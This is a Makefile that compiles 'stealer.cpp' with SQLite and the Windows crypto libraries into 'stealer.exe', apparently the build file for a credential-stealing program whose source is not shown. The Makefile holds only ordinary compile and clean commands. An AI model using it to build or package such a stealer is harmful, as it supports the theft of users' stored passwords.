CC=gcc
CXX=g++
LDFLAGS=  -static -lshell32  -lshlwapi -lcrypt32 -lbcrypt
PDB=-g
BIN=bin
ifeq ($(OS),Windows_NT)
	RM=powershell /c rm
else
	RM=rm
endif

all: stealer

# run sqlite3 before 
stealer:
	$(CXX)  stealer.cpp   sqlite3.o $(LDFLAGS) -o stealer.exe 

sqlite3:
	$(CC) -c sqlite3.c
clean:
	$(RM) *.exe 
	$(RM) *.o
